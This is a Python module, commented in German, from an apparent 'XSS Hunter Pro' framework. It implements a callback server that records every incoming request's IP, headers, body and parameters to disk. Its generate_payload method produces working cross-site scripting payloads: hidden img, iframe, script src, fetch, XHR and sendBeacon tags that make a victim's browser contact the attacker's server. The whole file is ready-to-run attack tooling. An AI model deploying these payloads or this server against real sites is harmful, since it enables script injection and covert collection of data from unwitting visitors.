#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
XSS Hunter Pro Framework - Modules - Callback Server
=====================================================

Dieses Modul implementiert einen Callback-Server für XSS-Angriffe.

Autor: Anonymous
Lizenz: MIT
Version: 0.3.0
"""

import os
import sys
import json
import logging
import threading
import socket
import time
import random
import string
from typing import Dict, List, Optional, Any, Tuple, Union, Set

# Versuche, die erforderlichen Module zu importieren
try:
    from http.server import HTTPServer, BaseHTTPRequestHandler
except ImportError:
    # Fallback für fehlende Module
    class HTTPServer:
        pass
    
    class BaseHTTPRequestHandler:
        pass

# Konfiguriere Logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.StreamHandler(sys.stdout)
    ]
)

logger = logging.getLogger("XSSHunterPro.CallbackServer")

# Versuche, den Error Handler zu importieren
try:
    from error_handler import handle_exception, log_error
except ImportError:
    logger.warning("Error Handler konnte nicht importiert werden. Verwende einfache Fehlerbehandlung.")
    
    # Einfache Fehlerbehandlung
    def handle_exception(func):
        def wrapper(*args, **kwargs):
            try:
                return func(*args, **kwargs)
            except Exception as e:
                logger.error(f"Fehler: {e}")
                return None
        return wrapper
    
    def log_error(error, error_type="UNKNOWN_ERROR", details=None):
        logger.error(f"{error_type}: {error}")
        if details:
            logger.error(f"Details: {details}")

# Versuche, die Utility-Funktionen zu importieren
try:
    from utils import (
        is_valid_port, is_valid_ip, generate_random_string,
        create_directory, write_file, read_file, load_json_file,
        save_json_file, get_timestamp, format_timestamp
    )
except ImportError:
    logger.warning("Utils-Modul konnte nicht importiert werden. Verwende einfache Implementierungen.")
    
    # Einfache Implementierungen der benötigten Funktionen
    def is_valid_port(port):
        return 0 < port < 65536
    
    def is_valid_ip(ip):
        return True
    
    def generate_random_string(length=8):
        characters = string.ascii_letters + string.digits
        return ''.join(random.choice(characters) for _ in range(length))
    
    def create_directory(directory_path):
        os.makedirs(directory_path, exist_ok=True)
        return True
    
    def write_file(file_path, content, binary=False):
        try:
            mode = "wb" if binary else "w"
            with open(file_path, mode) as f:
                f.write(content)
            return True
        except Exception as e:
            logger.error(f"Fehler beim Schreiben der Datei: {e}")
            return False
    
    def read_file(file_path, binary=False):
        try:
            mode = "rb" if binary else "r"
            with open(file_path, mode) as f:
                return f.read()
        except Exception as e:
            logger.error(f"Fehler beim Lesen der Datei: {e}")
            return b"" if binary else ""
    
    def load_json_file(file_path):
        try:
            with open(file_path, "r") as f:
                return json.load(f)
        except Exception as e:
            logger.error(f"Fehler beim Laden der JSON-Datei: {e}")
            return {}
    
    def save_json_file(data, file_path):
        try:
            with open(file_path, "w") as f:
                json.dump(data, f, indent=2)
            return True
        except Exception as e:
            logger.error(f"Fehler beim Speichern der JSON-Datei: {e}")
            return False
    
    def get_timestamp():
        return int(time.time())
    
    def format_timestamp(timestamp, format="%Y-%m-%d %H:%M:%S"):
        return time.strftime(format, time.localtime(timestamp))


class XSSCallbackHandler(BaseHTTPRequestHandler):
    """
    HTTP-Handler für den XSS-Callback-Server.
    """
    
    def __init__(self, *args, **kwargs):
        self.callbacks_dir = kwargs.pop("callbacks_dir", "callbacks")
        self.server_config = kwargs.pop("server_config", {})
        super().__init__(*args, **kwargs)
    
    def log_message(self, format, *args):
        """
        Überschreibt die Standard-Logging-Methode.
        """
        logger.info(f"{self.client_address[0]} - {format % args}")
    
    def do_GET(self):
        """
        Behandelt GET-Anfragen.
        """
        self._handle_request()
    
    def do_POST(self):
        """
        Behandelt POST-Anfragen.
        """
        self._handle_request()
    
    def _handle_request(self):
        """
        Behandelt eingehende Anfragen.
        """
        try:
            # Extrahiere Anfrageinformationen
            client_ip = self.client_address[0]
            request_path = self.path
            request_method = self.command
            request_headers = {key: value for key, value in self.headers.items()}
            
            # Lese den Anfragekörper
            content_length = int(self.headers.get("Content-Length", 0))
            request_body = self.rfile.read(content_length).decode("utf-8")
            
            # Extrahiere Query-Parameter
            query_params = {}
            
            if "?" in request_path:
                path_parts = request_path.split("?", 1)
                request_path = path_parts[0]
                
                query_string = path_parts[1]
                
                for param in query_string.split("&"):
                    if "=" in param:
                        key, value = param.split("=", 1)
                        query_params[key] = value
            
            # Erstelle den Callback-Datensatz
            callback_data = {
                "timestamp": get_timestamp(),
                "client_ip": client_ip,
                "request_path": request_path,
                "request_method": request_method,
                "request_headers": request_headers,
                "request_body": request_body,
                "query_params": query_params
            }
            
            # Speichere den Callback-Datensatz
            self._save_callback(callback_data)
            
            # Sende eine Antwort
            self._send_response(callback_data)
        except Exception as e:
            log_error(e, "CALLBACK_HANDLING_ERROR", {
                "client_ip": self.client_address[0],
                "path": self.path,
                "method": self.command
            })
            
            # Sende eine Fehlerantwort
            self.send_response(500)
            self.send_header("Content-type", "text/plain")
            self.end_headers()
            self.wfile.write(b"Internal Server Error")
    
    def _save_callback(self, callback_data):
        """
        Speichert einen Callback-Datensatz.
        
        Args:
            callback_data: Der zu speichernde Callback-Datensatz.
        """
        try:
            # Erstelle das Callbacks-Verzeichnis, falls es nicht existiert
            create_directory(self.callbacks_dir)
            
            # Generiere einen eindeutigen Dateinamen
            timestamp = callback_data["timestamp"]
            random_string = generate_random_string(8)
            filename = f"{timestamp}_{random_string}.json"
            
            # Speichere den Callback-Datensatz
            file_path = os.path.join(self.callbacks_dir, filename)
            save_json_file(callback_data, file_path)
            
            logger.info(f"Callback gespeichert: {file_path}")
        except Exception as e:
            log_error(e, "CALLBACK_SAVING_ERROR", {"callback_data": callback_data})
    
    def _send_response(self, callback_data):
        """
        Sendet eine Antwort an den Client.
        
        Args:
            callback_data: Der Callback-Datensatz.
        """
        try:
            # Bestimme die Antwort basierend auf der Konfiguration
            response_type = self.server_config.get("response_type", "empty")
            
            if response_type == "empty":
                # Sende eine leere Antwort
                self.send_response(200)
                self.send_header("Content-type", "text/plain")
                self.end_headers()
                self.wfile.write(b"")
            elif response_type == "pixel":
                # Sende ein 1x1-Pixel
                self.send_response(200)
                self.send_header("Content-type", "image/gif")
                self.end_headers()
                
                # 1x1-Pixel GIF
                pixel_data = b"\x47\x49\x46\x38\x39\x61\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff\x00\x00\x00\x21\xf9\x04\x01\x00\x00\x00\x00\x2c\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02\x44\x01\x00\x3b"
                
                self.wfile.write(pixel_data)
            elif response_type == "redirect":
                # Sende eine Weiterleitung
                redirect_url = self.server_config.get("redirect_url", "https://example.com")
                
                self.send_response(302)
                self.send_header("Location", redirect_url)
                self.end_headers()
            elif response_type == "custom":
                # Sende eine benutzerdefinierte Antwort
                custom_content_type = self.server_config.get("custom_content_type", "text/plain")
                custom_content = self.server_config.get("custom_content", "")
                
                self.send_response(200)
                self.send_header("Content-type", custom_content_type)
                self.end_headers()
                self.wfile.write(custom_content.encode("utf-8"))
            else:
                # Sende eine leere Antwort als Fallback
                self.send_response(200)
                self.send_header("Content-type", "text/plain")
                self.end_headers()
                self.wfile.write(b"")
        except Exception as e:
            log_error(e, "RESPONSE_SENDING_ERROR", {"callback_data": callback_data})
            
            # Sende eine Fehlerantwort
            self.send_response(500)
            self.send_header("Content-type", "text/plain")
            self.end_headers()
            self.wfile.write(b"Internal Server Error")


class CallbackServer:
    """
    XSS-Callback-Server.
    """
    
    def __init__(self, host="0.0.0.0", port=8080, callbacks_dir="callbacks", server_config=None):
        """
        Initialisiert den Callback-Server.
        
        Args:
            host: Die Host-Adresse, auf der der Server lauschen soll.
            port: Der Port, auf dem der Server lauschen soll.
            callbacks_dir: Das Verzeichnis, in dem Callbacks gespeichert werden sollen.
            server_config: Die Serverkonfiguration.
        """
        self.host = host
        self.port = port
        self.callbacks_dir = callbacks_dir
        self.server_config = server_config or {}
        self.server = None
        self.server_thread = None
        self.running = False
    
    @handle_exception
    def start(self):
        """
        Startet den Callback-Server.
        
        Returns:
            True, wenn der Server erfolgreich gestartet wurde, sonst False.
        """
        if self.running:
            logger.warning("Der Callback-Server läuft bereits.")
            return False
        
        # Überprüfe die Host-Adresse und den Port
        if not is_valid_ip(self.host):
            logger.error(f"Ungültige Host-Adresse: {self.host}")
            return False
        
        if not is_valid_port(self.port):
            logger.error(f"Ungültiger Port: {self.port}")
            return False
        
        try:
            # Erstelle das Callbacks-Verzeichnis, falls es nicht existiert
            create_directory(self.callbacks_dir)
            
            # Erstelle den HTTP-Server
            handler = lambda *args, **kwargs: XSSCallbackHandler(*args, callbacks_dir=self.callbacks_dir, server_config=self.server_config, **kwargs)
            self.server = HTTPServer((self.host, self.port), handler)
            
            # Starte den Server in einem separaten Thread
            self.server_thread = threading.Thread(target=self._run_server)
            self.server_thread.daemon = True
            self.server_thread.start()
            
            self.running = True
            
            logger.info(f"Callback-Server gestartet auf {self.host}:{self.port}")
            
            return True
        except Exception as e:
            log_error(e, "SERVER_START_ERROR", {"host": self.host, "port": self.port})
            return False
    
    def _run_server(self):
        """
        Führt den Server aus.
        """
        try:
            self.server.serve_forever()
        except Exception as e:
            log_error(e, "SERVER_RUN_ERROR", {"host": self.host, "port": self.port})
            self.running = False
    
    @handle_exception
    def stop(self):
        """
        Stoppt den Callback-Server.
        
        Returns:
            True, wenn der Server erfolgreich gestoppt wurde, sonst False.
        """
        if not self.running:
            logger.warning("Der Callback-Server läuft nicht.")
            return False
        
        try:
            # Stoppe den Server
            self.server.shutdown()
            self.server.server_close()
            
            # Warte auf das Ende des Server-Threads
            self.server_thread.join(timeout=5)
            
            self.running = False
            
            logger.info("Callback-Server gestoppt.")
            
            return True
        except Exception as e:
            log_error(e, "SERVER_STOP_ERROR", {"host": self.host, "port": self.port})
            return False
    
    @handle_exception
    def is_running(self):
        """
        Überprüft, ob der Server läuft.
        
        Returns:
            True, wenn der Server läuft, sonst False.
        """
        return self.running
    
    @handle_exception
    def get_callbacks(self, limit=None, sort_by_timestamp=True, reverse=True):
        """
        Gibt die gespeicherten Callbacks zurück.
        
        Args:
            limit: Die maximale Anzahl der zurückzugebenden Callbacks.
            sort_by_timestamp: Ob die Callbacks nach Zeitstempel sortiert werden sollen.
            reverse: Ob die Sortierreihenfolge umgekehrt werden soll.
        
        Returns:
            Eine Liste der Callbacks.
        """
        try:
            # Überprüfe, ob das Callbacks-Verzeichnis existiert
            if not os.path.isdir(self.callbacks_dir):
                logger.warning(f"Das Callbacks-Verzeichnis existiert nicht: {self.callbacks_dir}")
                return []
            
            # Finde alle Callback-Dateien
            callback_files = [f for f in os.listdir(self.callbacks_dir) if f.endswith(".json")]
            
            # Lade die Callbacks
            callbacks = []
            
            for filename in callback_files:
                file_path = os.path.join(self.callbacks_dir, filename)
                
                try:
                    callback_data = load_json_file(file_path)
                    callbacks.append(callback_data)
                except Exception as e:
                    log_error(e, "CALLBACK_LOADING_ERROR", {"file_path": file_path})
            
            # Sortiere die Callbacks nach Zeitstempel
            if sort_by_timestamp:
                callbacks.sort(key=lambda x: x.get("timestamp", 0), reverse=reverse)
            
            # Begrenze die Anzahl der Callbacks
            if limit is not None and limit > 0:
                callbacks = callbacks[:limit]
            
            return callbacks
        except Exception as e:
            log_error(e, "CALLBACKS_RETRIEVAL_ERROR", {"callbacks_dir": self.callbacks_dir})
            return []
    
    @handle_exception
    def clear_callbacks(self):
        """
        Löscht alle gespeicherten Callbacks.
        
        Returns:
            True, wenn die Callbacks erfolgreich gelöscht wurden, sonst False.
        """
        try:
            # Überprüfe, ob das Callbacks-Verzeichnis existiert
            if not os.path.isdir(self.callbacks_dir):
                logger.warning(f"Das Callbacks-Verzeichnis existiert nicht: {self.callbacks_dir}")
                return False
            
            # Finde alle Callback-Dateien
            callback_files = [f for f in os.listdir(self.callbacks_dir) if f.endswith(".json")]
            
            # Lösche die Callback-Dateien
            for filename in callback_files:
                file_path = os.path.join(self.callbacks_dir, filename)
                
                try:
                    os.remove(file_path)
                except Exception as e:
                    log_error(e, "CALLBACK_DELETION_ERROR", {"file_path": file_path})
            
            logger.info("Alle Callbacks gelöscht.")
            
            return True
        except Exception as e:
            log_error(e, "CALLBACKS_CLEARING_ERROR", {"callbacks_dir": self.callbacks_dir})
            return False
    
    @handle_exception
    def get_callback_count(self):
        """
        Gibt die Anzahl der gespeicherten Callbacks zurück.
        
        Returns:
            Die Anzahl der Callbacks.
        """
        try:
            # Überprüfe, ob das Callbacks-Verzeichnis existiert
            if not os.path.isdir(self.callbacks_dir):
                logger.warning(f"Das Callbacks-Verzeichnis existiert nicht: {self.callbacks_dir}")
                return 0
            
            # Zähle die Callback-Dateien
            callback_files = [f for f in os.listdir(self.callbacks_dir) if f.endswith(".json")]
            
            return len(callback_files)
        except Exception as e:
            log_error(e, "CALLBACK_COUNT_ERROR", {"callbacks_dir": self.callbacks_dir})
            return 0
    
    @handle_exception
    def get_server_info(self):
        """
        Gibt Informationen über den Server zurück.
        
        Returns:
            Ein Dictionary mit Serverinformationen.
        """
        return {
            "host": self.host,
            "port": self.port,
            "running": self.running,
            "callbacks_dir": self.callbacks_dir,
            "callback_count": self.get_callback_count(),
            "server_config": self.server_config
        }
    
    @handle_exception
    def update_server_config(self, config):
        """
        Aktualisiert die Serverkonfiguration.
        
        Args:
            config: Die neue Konfiguration.
        
        Returns:
            True, wenn die Konfiguration erfolgreich aktualisiert wurde, sonst False.
        """
        try:
            # Aktualisiere die Konfiguration
            self.server_config.update(config)
            
            logger.info("Serverkonfiguration aktualisiert.")
            
            return True
        except Exception as e:
            log_error(e, "SERVER_CONFIG_UPDATE_ERROR", {"config": config})
            return False
    
    @handle_exception
    def generate_payload(self, callback_path="/", payload_type="img", additional_params=None):
        """
        Generiert einen XSS-Payload für den Callback-Server.
        
        Args:
            callback_path: Der Pfad für den Callback.
            payload_type: Der Typ des Payloads.
            additional_params: Zusätzliche Parameter für den Payload.
        
        Returns:
            Der generierte Payload.
        """
        try:
            # Erstelle die Callback-URL
            callback_url = f"http://{self.host}:{self.port}{callback_path}"
            
            # Füge zusätzliche Parameter hinzu
            if additional_params:
                query_params = []
                
                for key, value in additional_params.items():
                    query_params.append(f"{key}={value}")
                
                if query_params:
                    callback_url += "?" + "&".join(query_params)
            
            # Generiere den Payload basierend auf dem Typ
            if payload_type == "img":
                return f'<img src="{callback_url}" style="display:none" alt="">'
            elif payload_type == "script":
                return f'<script src="{callback_url}"></script>'
            elif payload_type == "iframe":
                return f'<iframe src="{callback_url}" style="display:none"></iframe>'
            elif payload_type == "fetch":
                return f'<script>fetch("{callback_url}");</script>'
            elif payload_type == "xhr":
                return f'<script>var xhr=new XMLHttpRequest();xhr.open("GET","{callback_url}",true);xhr.send();</script>'
            elif payload_type == "beacon":
                return f'<script>navigator.sendBeacon("{callback_url}");</script>'
            else:
                logger.warning(f"Unbekannter Payload-Typ: {payload_type}")
                return f'<img src="{callback_url}" style="display:none" alt="">'
        except Exception as e:
            log_error(e, "PAYLOAD_GENERATION_ERROR", {
                "callback_path": callback_path,
                "payload_type": payload_type,
                "additional_params": additional_params
            })
            return ""


# Beispielverwendung
if __name__ == "__main__":
    # Erstelle einen Callback-Server
    server = CallbackServer(host="0.0.0.0", port=8080, callbacks_dir="callbacks")
    
    # Starte den Server
    if server.start():
        try:
            # Generiere einen Payload
            payload = server.generate_payload(payload_type="img")
            
            print(f"Callback-Server läuft auf http://0.0.0.0:8080")
            print(f"Beispiel-Payload: {payload}")
            
            # Halte den Server am Laufen
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            # Stoppe den Server bei Tastaturunterbrechung
            server.stop()
            print("Callback-Server gestoppt.")
